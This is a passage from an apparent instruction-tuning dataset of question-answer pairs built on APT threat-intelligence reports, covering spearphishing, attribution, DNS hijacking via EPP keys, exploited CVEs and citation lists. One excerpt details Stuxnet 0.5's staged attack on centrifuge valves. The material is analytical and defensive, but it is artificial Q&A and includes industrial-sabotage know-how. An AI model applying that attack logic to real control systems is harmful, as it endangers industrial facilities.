    "output": "Phishing: Spearphishing Link is a tactic employed by adversaries to gain access to victim systems by sending targeted emails with malicious links. In the case of the Geumseong12 group, their attack tactics have evolved over time, incorporating various techniques to evade detection. Initially, they utilized AOL Messenger communication, but later shifted to using WordPress websites as a C2 server for mediation server of spear phishing and watering hole attacks. They also exploited vulnerabilities in Flash player and used cloud services like Streamnation and pCloud to host their malware. Furthermore, they employed social engineering techniques, such as using Korean and Chinese expressions in their communication, to trick victims into clicking on malicious links. To evade detection, they used techniques like XOR encryption, mutex keys, and code obfuscation. The group's use of spearphishing links is a key component of their attack strategy, allowing them to gain initial access to victim systems and subsequently deploy additional malware.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Infrastructure and backend connections\nA preferred method for grouping targeted attack activity together is through cataloguing of the malicious use of network infrastructure. Command-and-control infrastructure can be costly and difficult to maintain, with the added complication that availability may be disrupted by researchers, law enforcement, or a spooked system administrator (in the case of compromised infrastructure). Even well-resourced attackers have a tendency for reusing command-and-control or phishing infrastructure. For threat intelligence teams building databases of targeted attack-related infrastructure, this is often the most telling sign of an attacker resurfacing or retooling. In rare instances, multiple attack groups may go after the same vulnerable server (particularly with teams that insist on using compromised infrastructure rather than mounting their own) but this remains rare enough to be an outlier. The trend at this time remains that even in cases of infrastructure reuse between teams, these occur within the same threat actor cluster (as in the case of multiple independent 'Chinese-speaking' threat actors getting their hands on the same zero-days, some overlapping infrastructure, or sharing lateral movement tools \u2013 a situation that speaks more to the tasking arrangement or 'community' of attackers in this cluster than to a breakdown in attribution methods).\nIn the case of researchers with a privileged point of view, such as those working with email services, ISPs, or those providing support for a compromised server, backend connections can be a serendipitous and often telling attributory indicator. What we\nmean by 'backend connections' are connections that take place when an attacker retrieves data from an exfiltration server or email account, prepares a staging or phishing server, or checks in on a compromised domain to assure its continued availability. Attackers almost always use Tor or some other anonymizing service to mask this connection but mistakes happen more often than not. The mistake will likely provide researchers with an IP or a region telling of the native operations of the attacker.\nSmall Headline: Malware families\nAlthough even the most advanced threat actors may rely on publicly available tools, most take the time to build their toolkits and develop custom backdoors, lateral movement tools, and exploits. Knowing the value of what they've developed, actors will jealously guard their toolkit, thereby allowing researchers to hone in on a threat actor by the presence of a tightly controlled malware family. In simpler terms: if Snake is present then it looks like Turla; if WildPositron malware is found then it's probably Lazarus, and so on. It's important to remember that 'malware ownership' isn't static. Just as the malware itself develops over time, the ownership may be transferred. It can be shared with other teams in the same cluster, developers may leave or set up their own shops, or source code may leak through a variety of circumstances.\nSmall Headline: Code reuse\nIn cases where an actor has been exposed or has found other motivations for a top-down retooling, code reuse can indicate a relationship between currently used tools and their predecessors. Coders can be quite lazy and even when the intention is a full retooling, malware developers will often reuse specifi c functions or pieces of code that have worked well in the past. This means that the avid researcher or obsessive yara rule writer may be able to hone in on these traits and connect new and old campaigns, or even seemingly unrelated threat actors.\nSmall Headline: Passwords\nA similar circumstance applies to the reuse of passwords. These may be the passwords to email accounts used for phishing or exfiltration, accounts on compromised servers, or hard-coded passwords in malware components. A recent example saw a threat actor deploying droppers with password-protected resources that contained the actual payload in an attempt to thwart sandboxes and automatic detection systems. The hard-coded password protecting the resource was the same even when different, seemingly unrelated malware families were being dropped, thus allowing researchers to tie the two malware families to the same actor. This also applies to hard-coded encryption keys in different malware families or campaigns.\nSmall Headline: Exploits\nFinally, zero-day exploits are a great source of excitement in research circles these days. The presence of an '0-day' immediately sets an actor apart from the run-of-the-mill attackers, thus justifying greater researcher involvement.\nThough exploits may be repurposed or acquired from public sources, a greater emphasis on responsible disclosure has limited the availability of the latter by dissuading the release of fully developed 'proof-of-concept' code that may aid attackers in leveraging newly discovered exploits2 . That said, many advanced attackers have exploit developers in house, with some threat actors unleashing a seemingly unlimited supply of exploits where needed.\nWith a given exploit being an arcane and jealously guarded weapon in the attacker's arsenal, home grown implementations of an exploit allow researchers to group together diverse malware families or separate campaigns to a given cluster. When a specific implementation of a zero-day appears in separate unrelated instances within a given timeframe (even long after the zero-day was identified and patched), it signifi es code sharing likely pointing to the same actor or activity cluster. Despite discussions of parallel discovery [2] of exploits by different vulnerability researchers in a given timeframe, exploit implementations differ. However, this does not entirely discount the possibility of a double-dealing seller in the black or grey market or other unexpected threat actor interactions like exploit repurposing, as evidenced with Equation team's reuse of CVE-2013-3918 within a couple of days of its initial use by the Aurora actors [3]. One also cannot discount the nefarious possibility that a disclosed exploit repository itself has been hacked, as this represents a boon for an advanced attacker with indisputable return on investment.\nQuestion: How can the reuse of command-and-control infrastructure be utilized to identify the resurfacing or retooling of a threat actor?",
    "output": "Answer: The reuse of command-and-control infrastructure is a significant indicator for identifying the resurfacing or retooling of a threat actor. Since maintaining such infrastructure can be costly and difficult, attackers often reuse it, which allows threat intelligence teams to catalog and track this behavior. Even though multiple attack groups might occasionally use the same vulnerable server, this remains rare and usually occurs within the same threat actor cluster. By monitoring these patterns, researchers can attribute ongoing or new attacks to known threat actors.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Background on Domain Name Services and records management\nThe threat actors behind the Sea Turtle campaign were successful in compromising entities by manipulating and falsifying DNS records at various levels in the domain name space. This section provides a brief overview of where DNS records are managed and how they are accessed to help readers better understand how these events unfolded.\nThe first and most direct way to access an organization's DNS records is through the registrar with the registrant's credentials. These credentials are used to login to the DNS provider from the client-side, which is a registrar. If an attacker was able to compromise an organization's network administrator credentials, the attacker would be able to change that particular organization's DNS records at will.\nThe second way to access DNS records is through a DNS registrar, sometimes called registrar operators. A registrar sells domain names to the public and manages DNS records on behalf of the registrant through the domain registry. Records in the domain registry are accessed through the registry application using the Extensible Provisioning Protocol (EPP). EPP was detailed in the as \"a means of interaction between a registrar's applications and registry applications.\" If the attackers were able to obtain one of these EPP keys, they would be able to modify any DNS records that were managed by that particular registrar.\nThe third approach to gain access to DNS records is through one of the registries. These registries manage any known TLD, such as entire country code top-level domains (ccTLDs) and generic top-level domains (gTLDs). For example, Verisign manages all entities associated with the top-level domain (TLD) \".com.\" All the different registry information then converges into one of organization that manage different parts of the domain registry root. The domain registry root is stored on 13 \"named authorities in the delegation data for the root zone,\" according to .\nFinally, actors could target root zone servers to modify the records directly. It is important to note that there is no evidence during this campaign (or any other we are aware of) that the root zone servers were attacked or compromised. We highlight this as a potential avenue that attackers would consider. The root DNS servers issued a that stated, \"There are no signs of lost integrity or compromise of the content of the root [server] zone\u2026 There are no signs of clients having received unexpected responses from root servers.\"\nQ: How does the Extensible Provisioning Protocol (EPP) play a role in the Sea Turtle campaign, and why is securing EPP keys crucial for DNS security?",
    "output": "The Extensible Provisioning Protocol (EPP) is a protocol used for communication between a registrar's applications and registry applications. In the Sea Turtle campaign, if attackers obtained EPP keys, they would gain the ability to modify any DNS records managed by that particular registrar. Securing EPP keys is crucial because they provide high-level access to DNS records. If compromised, attackers could redirect traffic, intercept communications, and perform other malicious activities, thereby undermining the trust and security of the entire DNS system. Ensuring the security of EPP keys helps prevent unauthorized changes to DNS records and maintains the integrity of domain name resolution.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What are the key indicators that suggest Operation Lotus Blossom is likely conducted by a nation-state adversary, and how does this impact the assessment of the threat?",
    "output": "Key indicators suggesting Operation Lotus Blossom is conducted by a nation-state adversary include the long-term nature of the campaign, the use of custom tools like the Elise backdoor, and the persistent targeting of government and military organizations in Southeast Asia. The ability to develop custom tools and maintain command and control infrastructure over a long period indicates a well-resourced and sophisticated adversary. This impacts the threat assessment by highlighting the need for robust defenses against advanced persistent threats (APTs) that are likely backed by significant resources and strategic objectives.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: REFERENCES\nBirdman. (2011, July\t31). Xecure Lab\t Blog.\t Retrieved August\t 12,\t2011,\tfrom http://blog.xecure\u00adlab.com/2011/07/2500.html\nCEOinIRVINE.\t (2011,\t August 17).\t Information Security & US \t&\t Life\t & Love\t& Fashion & Hacking & Passion.\t Retrieved\t September 13,\t 2011,\t from\t http://hack3r.tistory.com/tag/Malware\nCommand Five Pty\t Ltd.\t (2011,\t June). Advanced Persistent Threats: A\t Decade\t in Review. Retrieved\t September 24, 2011,\tfrom Command\t Five Pty\tLtd:\t http://www.commandfive.com/papers/C5_APT_ADecadeInReview.pdf\nDomain Tools,\t LLC.\t (2011). AlYAc.org \u00adAl\t Y Ac \u00adScreenshot History.\t Retrieved\t September 08, 2011, from\t DomainTools:\thttp://www.domaintools.com/research/screenshot\u00adhistory/alyac.org\nDomain Tools,\t LLC.\t (2011). Reverse\t Whois Lookup | Domain Ownership Search\t | Domain Tools.\t Retrieved September 22,\t 2011,\t from\t Domain Tools:\thttp://www.domaintools.com/research/reverse\u00adwhois/?all[]=leecooper%40korea.com&none[]=\nEDaily.\t (2011,\t August\t 11).\t Nate\thack\t related. Retrieved September 14,\t 2011,\t from EDaily\tKorean News: http://www.edaily.co.kr/news/NewsRead.edy?SCD=DC16&newsid=02056566596346336&DCD=A0140 5&OutLnkChk=Y\nESTsoft. (2011,\t August\t 04). ESTsoft apology for\tALTools\t security vulnerability. Retrieved September 14, 2011, from\t ESTsoft Blog:\thttp://blog.estsoft.co.kr/138\nESTsoft. (2011,\t August\t 05). ESTsoft news release\t with respect to\t ALTools\tsecurity\t vulnerability. Retrieved September 19,\t 2011,\t from\t ESTsoft Blog:\thttp://blog.estsoft.co.kr/139\nESTsoft. (2011,\t August\t 11). Police release\t interim results on Nate\t hack. Retrieved September 14, 2011, from\t ESTsoft Blog:\thttp://blog.estsoft.co.kr/143\nESTsoft. (2011,\t August\t 04). Urgent security patches for public\tALTools products. Retrieved September 20,\t2011,\t from ALTools Announcements:\thttp://www.altools.co.kr/Plaza/Notice_Contents.aspx?idx=828\nETnews.\t(2011,\tAugust 05).\t ETnews \u00adNate\thack, planned since last year? Retrieved\t August 12, \t2011,\t from\t http://www.etnews.com/news/print.html?id=201108050128\nGFI \tSandBox. (2011, May\t30). GFI SandBox Malware Analysis Report: Backdoor.Win32.Generic. Retrieved September 22,\t 2011,\t from\t GFI\tSandBox: http://xml.ssdsandbox.net/view/6c6adbd087276ae89f8262582798b708\nGFI \tSandBox. (2011, July\t15).\t GFI SandBox Malware Analysis Report: Trojan.Win32.AgentBypass.\t Retrieved\t August 25,\t 2011, from\t http://xml.ssdsandbox.net/view/fdf2c5c2b1874efe7fd335092df2d3bc\nGFI \tSandBox. (2011, May\t29). GFI SandBox Malware Analysis Report: Trojan.Win32.Generic!SB Trojan.Trojan.Win32.Generic.\t Retrieved September 2011, 2011,\t from\t http://xml.ssdsandbox.net/view/bce1069dd099f15170c5fd05bae921b5\nGFI \tSoftware. (2011, February\t08).\t CWSandbox Report By\t MD5 \tat Sunbelt Security.\t Retrieved September 22,\t 2011, from http://www.sunbeltsecurity.com/partnerresources/cwsandbox/md5.aspx?id=e8ee9373ee6c836042e8f 48d8de2dda9\nGoodin, D.\t(2011,\tAugust 12).\t Software maker fingered in Korean hackocalypse. Retrieved September 06, 2011, from The Register: http://www.theregister.co.uk/2011/08/12/estsoft_korean_megahack/\nHauri \u00adResponse Team. (2011,\tAugust\t 04).\t SK Communications detailed analysis report of nateon.exe malware.\t Retrieved\t August 12,\t 2011,\t from\t http://www.hauri.co.kr/updata/SK_detail_report.pdf\nHispasec Sistemas.\t (2011,\t September 06).\t VirusTotal.\t Retrieved September 22,\t 2011,\t from http://www.virustotal.com/file\u00adscan/report.html?id=727c5a2c3db079351a79351a79367a1d9eada072a8e19bce0a02eb680088e8eae9b d67\u00ad1315308204\nHispasec Sistemas.\t (2011,\t August 03).\t VirusTotal \u00adFree online\tVirus, Malware and URL Scanner. Retrieved August 12,\t 2011, from\t http://www.virustotal.com/file\u00adscan/report.html?id=74455d5e8f99272aec64bce106b1e8ff39a122a7d27d362a274af31ab5a4fb1e\u00ad1313643321\nHispasec Sistemas.\t (2011,\t August 19).\t VirusTotal \u00adFree Online\t Virus, Malware and URL Scanner. Retrieved\t September 22,\t 2011,\t from\t http://www.virustotal.com/file\u00adscan/report.html?id=74455d5e8f99272aec64bce106b1e8ff39a122a7d27d362a274af31ab5a4fb1e\u00ad1313760695\nHispasec Sistemas.\t (2011,\t July\t29).\t VirusTotal \u00adFree\tOnline\tVirus, Malware and URL Scanner. Retrieved September 22,\t 2011, from\t http://www.virustotal.com/file\u00adscan/report.html?id=74455d5e8f99272aec64bce106b1e8ff39a122a7d27d362a274af31ab5a4fb1e\u00ad1311902003\nHispasec Sistemas.\t (2011,\t August 07).\t VirusTotal \u00adFree Online\t Virus, Malware and URL Scanner. Retrieved\t August\t 18,\t 2011, from\t http://www.virustotal.com/file\u00adscan/report.html?id=b6aecab3c07e915e27db4b4be4c32de1ffa613029818bbd1bb755653c10fbe38\u00ad1311920836\nJapanese IT\t Promotion Agency.\t(2011,\t June 29). IPA/ISEC: Vulnerabilities: Security\t Alert for\tVulnerability\t in ALZip. Retrieved\t September 18, 2011,\tfrom\t Japanese IT\t Promotion Agency: http://www.ipa.go.jp/security/english/vuln/201106_alzip_en.html\nJin\u00adwoo\t Seo,\t J.\u00adh.\tH.\t (2011,\t July\t28).\t 35mn User Info Leaked in Cyber Attack\t against S. Korean Portals. Retrieved\t September 19,\t 2011,\t from\t MK\t Business News:\t http://news.mk.co.kr/english/newsRead.php?sc=30800005&cm=General&year=2011&no=491540&selF lag=sc&relatedcode=&wonNo=&sID=308\nJSUNPACK. (2011, July\t27). jsunpack \u00ada generic\tJavaScript unpacker.\t Retrieved August\t 14,\t2011,\t from\t http://jsunpack.jeek.org/dec/go?report=9f5addc7e0c7c57eab347ba10e9a81a032cf0daf\nJSUNPACK. (2011, July\t27). jsunpack \u00ada generic\tJavaScript unpacker.\t Retrieved August\t 08,\t2011,\t from\t http://jsunpack.jeek.org/dec/go?report=f84cd73dabf186607f986df98c5402a57bb58ad1\nJSUNPACK. (2011, July\t27). jsunpack \u00ada generic\tJavaScript unpacker.\t Retrieved August\t 04,\t2011,\t from\t http://jsunpack.jeek.org/dec/go?report=2c645b8dee2789a0d5d1c1e173ca3bb6b0d0528e\nKryo. (2010,\t February\t 6).\t kryo.se: iodine\t(IP\u00adover\u00adDNS, IPv4 over DNS \ttunnel).\t Retrieved September 18, 2011, from\t kryo.se:\thttp://code.kryo.se/iodine\nMalc0de.com.\t (n.d.).\t 116.127.121\t |\t Malc0de\tDatabase. Retrieved August\t 22, 2011, from\t Malc0de Database:\t http://malc0de.com/database/index.php?search=116.127.121&IP=on\nMicrosoft.\t (2007,\tDecember 10). A description of Svchost.exe\t in Windows XP Professional\t Edition. Retrieved\t September 07,\t 2011,\t from\t Microsoft\t Support: http://support.microsoft.com/?kbid=314056\nMicrosoft.\t (2007,\tDecember 04). What is a DLL? Retrieved\t September 18,\t 2011,\t from Microsoft Support: http://support.microsoft.com/kb/815065\nMicrosoft.\t (n.d.).\t Security\t Center \u00adBulletins Advisories Tools\tGuidance\tResources. Retrieved\t September 09,\t 2011,\t from Microsoft\t Security\tTechCenter: http://technet.microsoft.com/en\u00adus/security/default\nMister Group.\t (n.d.).\t nateon.exe\t \u00adWhat is the\t nateon.exe? Retrieved\t September 06,\t 2011,\tfrom\t http://systemexplorer.net/db/nateon.exe.html\nMoon\u00adyoung,\t L.\t (2011,\t August 12).\t Personal\t information hack\t traced to\t Chinese IP\t address. Retrieved September 09,\t 2011, from\t The Hankyoreh Media Company: http://english.hani.co.kr/arti/english_edition/e_national/491514.html\nMullaney,\tC.\t(2011, July\t30).\t Backdoor.Sogu Technical\t Details\t| Symantec.\t Retrieved\t August 18,\t 2011,\t from\t http://www.symantec.com/security_response/writeup.jsp?docid=2011\u00ad073003\u00ad5345\u00ad99\nNational Institute of Standards and\t Technology.\t(n.d.).\t National\t Vulnerability\t Database.\t Retrieved September 20, 2011,\tfrom http://nvd.nist.gov/home.cfm\nNovell.\t (2011).\t Novell Customer: Cite\tMedia Holding Group.\t Retrieved\t July\t 29,\t 2011,\t from\t http://www.novell.com/success/cite.html\nParkour,\t M. (2011, July\t14). contagio: Jul 13 CVE\u00ad2010\u00ad2883 PDF Meeting Agenda with more Poison Ivy www.adv138mail.com |\t 112.121.171.94. Retrieved September 22,\t2011,\tfrom Contagiodump Blog:\t http://contagiodump.blogspot.com/2011/07/jul\u00ad13\u00adcve\u00ad2010\u00ad2883\u00adpdf\u00admeeting\u00adagenda.html\nSamsung IDC. (2011, August 05).\t Samsung IDC\tHelpdesk Notice.\t Retrieved\t August 12, 2011,\tfrom http://www.samsungidc.com/helpdesk/notice_view.jsp?bpd_seq=0000001532\nSK Communications. (n.d.).\t SK\t Communications \u00adAbout Us.\t Retrieved September 06, 2011,\tfrom http://corp.skcomms.co.kr/eng/global.htm\nSung\u00adjin,\t Y.\t (2011, July 28).\t 35m\t Cyworld, Nate\tusers' information hacked. Retrieved\t September 06,\t 2011,\t from\t Korea Herald:\thttp://www.koreaherald.com/lifestyle/Detail.jsp?newsMLId=20110728000881\nThe Internet Archive.\t (2010, August 14).\t Error\tpage. Retrieved\t September 18,\t 2011,\t from\t The Internet Archive Wayback Machine: http://web.archive.org/web/20100814135834/http://www.cph.com.tw/1jebugldgJtOAjb1wnXe8A==\nThreatExpert. (2011, July\t13).\t ThreatExpert Report: Trojan.Win32.Scar.dysk, Bat/sdel.\t Retrieved September 22,\t 2011,\tfrom http://www.threatexpert.com/report.aspx?md5=16a31aa8e7ddf66a31551840573b6575\nThreatExpert. (2011, August 03).\t ThreatExpert Report: Trojan.Win32.Scar.dzoc. Retrieved\t September 22, 2011, from http://www.threatexpert.com/report.aspx?md5=bce1069dd099f15170c5fd05bae921b5\nThreatExpert. (2011, July\t29).\t ThreatExpert Report: Virus.Win32.Virut.\t Retrieved September 22, 2011, from\t http://www.threatexpert.com/report.aspx?md5=aba9baea70825e6adf0723587f273dc4\nTMCnews.\t(2011,\t August 11).\t S. Korea plans to\t scrap online\treal\u00adname\tsystem. Retrieved September 19, 2011, from\t TMCnews: http://www.tmcnet.com/usubmit/2011/08/11/5698912.htm\n\nHow did the attackers exploit the legitimate software update mechanism in the SK Communications intrusion, and what lessons can be learned from this methodology to enhance security practices?",
    "output": "A: The attackers used a trojaned software update to gain access to the target network, effectively turning a security practice into a vulnerability. This highlights the importance of verifying the integrity and authenticity of software updates. Organizations should implement robust update verification mechanisms, such as digital signatures, to ensure that updates come from trusted sources.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did the Ke3chang attackers utilize CVE-2012-4681 in their Advanced Persistent Threat (APT) campaign?",
    "output": "CVE-2012-4681 is a vulnerability in the Java Runtime Environment (JRE) that allows remote attackers to execute arbitrary code. In the context of the Ke3chang APT campaign, the attackers leveraged this vulnerability to gain access to their targets' systems. According to the report, the Ke3chang attackers used a Java zero-day vulnerability (CVE-2012-4681) as one of their exploitation methods, in addition to spear-phishing emails with malware attachments or links to malicious downloads. They used this vulnerability before a patch was available, demonstrating their ability to quickly adapt and exploit newly discovered vulnerabilities. By utilizing CVE-2012-4681, the Ke3chang attackers were able to bypass SecurityManager restrictions and access restricted classes, ultimately allowing them to execute arbitrary code on the targeted systems.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: Format 1\n\"####\": Decoded as two separate two-digit numbers representing the stage number and the centrifuge number within the stage, respectively. The stage number must be in the decimal range 1 to 15, which matches with the known Natanz configuration. For each of these 15 stages, the maximum number of expected centrifuges in each corresponding stage is looked up in the following array.\nThis means, for example, stage 3 is expected to have a second two digit number equal to 4 or less. This requirement is consistent with the centrifuge arrangement within a cascade.\nSmall Headline: Device type A\n\"##<delimiter><string>\": A two digit number in the range 1 to 3 with an optional string preceded by a delimiter character. The string must start with the letter S and contain the letter P. If the string is present, the device is modified to be device type 0xB instead (Flow Rate Transmitter Controller Output, rather than device type 0xA which is Flow Rate Transmitter Controller Input).\nBased on the symbol fingerprinting, the following table summarizes what devices and labels Stuxnet looks for within the symbol table.\nMedium Headline: Symbol address parsing\nEach symbol label will have two corresponding addresses:  -- the address in the process image area and the direct peripheral address of the device represented by the symbol. Modifying the memory at these addresses allows the PLC to control and read the behavior of the associated device. For example, the value may be a Boolean value turning a switch on or off, or a 16-bit value representing the current temperature of the system. Addresses can be either outputs (the PLC sets the value to modify the behavior of the device) or inputs (the PLC reads the value to determine the current state of the device).\nDevice types 0, 1, 5, and B must be output addresses and device types 2, 3, 4, 5, 6, 7, 8, 9, A, and C must be input addresses.\nValues at addresses for device types 0, 1, 2, 3, 4, and 5 must be bit values. Values at addresses for device types 6, 7, 8, 9, A, B, and C must be 16-bit values.\nMedium Headline: Cascade rating and building DB8061\nAfter parsing the symbols and addresses for each cascade, the code inspects the configuration of each cascade. Depending on the configuration, a rating is calculated. Certain devices in certain configurations will result in higher ratings. When complete, only the six highest-rated cascades have data written to DB8061.\nFinally, a flag is set signifying DB8061 has been built. This flag is reset to 0 every time the \"DOWNLOAD\" verb is executed.\nMedium Headline: PLC device attack code\nThe code conducts an attack by closing valves in the six top rated cascades out of the possible 18 cascades. The states of two types of valves are modified:\n\u2022 Centrifuge valves \u2013 a set of three valves (feed, product, tails) that work in unison per centrifuge to control uranium hexafluoride (UF6) flow into each centrifugeStage valves \u2013 one per stage to control UF6 flow into each stage\n\u2022 Auxiliary valves \u2013 valves that control UF6 flow into or out of each stage (stage valve) or the cascade as a whole\nFigure 2\nExample valve configuration showing both valve types in three stages of a cascade\nSimilar to version 1.x of Stuxnet, the PLC device attack code consists of a state machine with eight possible states:\nState 0 (Wait): Perform system identification and wait for the enrichment process to reach steady state before attack. This can take approximately 30 days.\nState 1 (Record): Take peripheral snapshots and build fake input blocks for replaying later.\nState 2 (Attack centrifuge valves): Begin replaying fake input signals. Close valves on most centrifuges.\nState 3 (Secondary pressure reading): Open both centrifuge and feed stage valves in the final stage of a single cascade to obtain a low pressure reading.\nState 4 (Wait for pressure change): Wait for desired pressure change or time limit. This can take up to approximately two hours.\nState 5 (Attack auxiliary valves): Open all auxiliary valves except valves believed to be near the first feed stage (stage 10). Wait for three minutes in this state.\nState 6 (Wait for attack completion): Wait for six minutes while preventing any state changes.\nState 7 (Finish): Reset and return to state zero.\nFigure 3\nState flow diagram of 417 PLC device attack code\nSmall Headline: State 0:\nThe code verifies the system has reached steady state by monitoring the state of each auxiliary valve and the amount of elapsed time.\n\u2022 The valves must not change state for a period of 300 snapshots. In addition, the code determines if most of the centrifuge valves are in the open or closed position.\n\u2022 All cascades must be operational for three or more days, or currently be in the down state.\n\u2022 At least one cascade must have been operating for more than 35 days, or collectively all cascades must have been operating for more than 297 days.\n\u2022 Between 3 and 7 of the first 21 auxiliary valves must have been opened in the last 2 days.\n\u2022 Most of the pressure readings associated with the auxiliary valves must be within an expected range.\nOnly if these all conditions are met does the code proceed to state 1.\nSmall Headline: State 2:\nFirst, the normal operating pressure is obtained and stored for replay later. For each stage a portion of all the centrifuge valves are closed, except in the feed stage (stage 10). The centrifuge valves in the feed stage remain completely open, while the centrifuge valves at both the product end and tails end are completely closed.\nThe particular centrifuge valves closed per stage are randomly chosen. The code will randomly chose a starting centrifuge valve and then close the next one in order until the last centrifuge valve in the stage. If the total desired number of valves to close for that stage has not been reached, the code will continue from the first centrifuge valve in the stage until the maximum valves to close are reached.\nSmall Headline: State 4:\nState 4 waits for the desired pressure change or other predetermined time limits before proceeding to state 5. If any of the following conditions are met, the code will continue to state 5:\n\u2022 The pressure of the stage 10 or stage 11 transducer (these are likely transducers for or near the feed stage) has an absolute value greater than 280 units above the expected value and greater than five times the expected value.\n\u2022 46 minutes after the state of an auxiliary valve has been modified from the original state recorded in state 1, with the exception of auxiliary valve number 17 which is likely a stage valve near the product end.\n\u2022 2 hours and 3 minutes after the attack started (since state 2) without any centrifuge valve state changes.\n\u2022 2 hours and 3 minutes since at least four centrifuge valve states have been modified from the original state recorded in state 1.\nSmall Headline: State 7:\nData is reset and the code returns to state 0.\nBy closing all valves except the initial feed stage valves, UF6 will continue to flow into the system.  This act alone may cause damage to the centrifuges themselves. However, the attack expects the pressure to reach five times the normal operating pressure. At this pressure, significant damage to the uranium enrichment system could occur and the UF6 gas could even revert to a solid.\nWhether the attack succeeded in this manner or not remains unclear. Even if the attack did succeed, the attackers decided to move to a different strategy in the Stuxnet 1.x versions, attacking the speed of the centrifuges instead.\nBig Headline: Conclusion\nStuxnet 0.5 clarifies the evolution and history of Stuxnet. Stuxnet clearly became more aggressive over time and switched development platforms as it evolved from 0.5 versions to later 1.x versions.\nKey parts of the 417 attack code missing from versions 1.x is fully implemented in Stuxnet 0.5. This demonstrates that the 417 attack code was the first attack strategy implemented by Stuxnet. This original 417 attack code attempted to modify valve states during the uranium enrichment process at Natanz, Iran, to cause damage to the centrifuges and the system as a whole.\nFigure 4\nLow-enriched uranium production (source ISIS)\nThe success of Stuxnet 0.5 remains unknown. However, the chart in figure 4 references uranium enrichment production at Natanz to key milestones of Stuxnet development. Interesting events are dips in feed or production amounts and lower levels of production given the same or greater feed amounts (shown as gaps between the two lines).\nWhile the discovery of Stuxnet 0.5 helps to deepen our overall understanding of Stuxnet and what its goals are, versions remain unrecovered. If these are located, they may expose other secrets behind this operation and more clues to its origins, but obtaining these other samples may prove to be next to impossible.\n\nQ: How does Stuxnet 0.5 parse and utilize symbol addresses to control and read the behavior of associated devices?",
    "output": "A: Stuxnet 0.5 parses symbol labels to find two corresponding addresses: the address in the process image area and the direct peripheral address of the device represented by the symbol. By modifying the memory at these addresses, the PLC can control and read the behavior of the associated device. Device types 0, 1, 5, and B must be output addresses, while device types 2, 3, 4, 5, 6, 7, 8, 9, A, and C must be input addresses. Values at addresses for device types 0, 1, 2, 3, 4, and 5 must be bit values, while values at addresses for device types 6, 7, 8, 9, A, B, and C must be 16-bit values.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the LuckyMouse APT's use of CVE-2017-11882 relate to their tactics, techniques, and procedures (TTPs) in the context of the data center waterholing campaign?",
    "output": "CVE-2017-11882 is a Microsoft Office Memory Corruption Vulnerability that allows an attacker to run arbitrary code in the context of the current user. In the context of the LuckyMouse APT's data center waterholing campaign, it is mentioned that the group has used weaponized documents with CVE-2017-11882, although it is unclear if this was the initial infection vector for the campaign. However, this suggests that LuckyMouse has employed CVE-2017-11882 as part of their TTPs, which is consistent with their use of other exploits and tools, such as the HyperBro Trojan and Metasploit's shikata_ga_nai encoder. Furthermore, the fact that CVE-2017-11882 has been widely used by Chinese-speaking actors since December 2017, and LuckyMouse is attributed to this group, reinforces the connection between the APT's TTPs and the vulnerability.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Microsoft.\t (2007,\tDecember 10). A description of Svchost.exe\t in Windows XP Professional Edition. Retrieved\t September 07,\t 2011,\t from\t Microsoft\t Support: http://support.microsoft.com/?kbid=314056\nMicrosoft\t Corporation.\t (2011,\t September 07). Locales\tand Languages (Windows).\t Retrieved January 24, 2012, from Microsoft\t Software Development\t Network:\thttp://msdn.microsoft.com/en\u00adus/library/dd318716.aspx\nMicrosoft\t Corporation.\t (2011,\t September 07). OSVERSIONINFOEX structure.\t Retrieved\t January\t17, 2012, from\t Microsoft\t Software Development\t Network:\thttp://msdn.microsoft.com/en\u00adus/library/windows/desktop/ms724833(v=vs.85).aspx\nMicrosoft\t Corporation.\t (2011,\t September 07). SYSTEM_INFO structure.\t Retrieved\t January\t24,\t 2012,\t from\t Microsoft\t MSDN: http://msdn.microsoft.com/en\u00adus/library/windows/desktop/ms724958(v=vs.85).aspx\nMullaney,\tC.\t(2011, July\t30).\t Backdoor.Sogu Technical\t Details\t| Symantec.\t Retrieved\t August 18,\t 2011,\t from\t http://www.symantec.com/security_response/writeup.jsp?docid=2011\u00ad073003\u00ad5345\u00ad99&tabid=2\nParkour,\t M. (2011, July\t05). contagio: Jul 5\tCVE\u00ad2010\u00ad2883\tPDF invitation.pdf with Poison Ivy from 112.121.171.94 | pu.flower\u00adshow.org. Retrieved January 28, 2012, from\t Contagio:\t http://contagiodump.blogspot.com/2011/07/message\u00adtargeting\u00adexperts\u00adon\u00adJapan.html\nParkour,\t M. (2011, July\t14). Jul 13 CVE\u00ad2010\u00ad2883 PDF Meeting Agenda with more Poison Ivy\t www.adv138mail.com |\t 112.121.171.94. Retrieved\t September 22,\t 2011, from Contagiodump\t Blog: http://contagiodump.blogspot.com/2011/07/jul\u00ad13\u00adcve\u00ad2010\u00ad2883\u00adpdf\u00admeeting\u00adagenda.html\nRasmussen,\t R.\t (2011). Practical Usage of Passive\tDNS \tMonitoring for\t E\u00adCrime Investigations.\t Retrieved\t January 04, 2011,\tfrom http://conferences.npl.co.uk/satin/presentations/satin2011slide3\u00adRasmussen.pdf\nrbls.\t (2011, November 01).\t shenqi.travlman.com is not listed in any blacklists.\t Retrieved\t November 01,\t 2011,\t from\t rbls:\thttp://rbls.org/shenqi.travlman.com\nSafeZoneCast.\t (2011,\t August 09).\t SafeZoneCast. Retrieved\t December 30,\t 2011,\t from http://safezonecast.lgcns.com/Common/MenaceInfo/pop.MenaceInfo.jsp?code=SZ1108\u00ad0003NS\nSandbox,\t G. (2010, December 26). GFI Sandbox Malware Analysis Report: Trojan\u00adDownloader.Win32.Generic.\t Retrieved\t November 29,\t 2011,\tfrom\t GFI\t Sandbox: http://xml.ssdsandbox.net/view/3df0d0ab4ad9da4559a1c6464c8526d1\nshapeless.\t (n.d.).\t Poison Ivy 2.3.0\tDocumentation. Retrieved\t August 17, 2011,\t from\t Poison Ivy\t \u00adRemote Administration 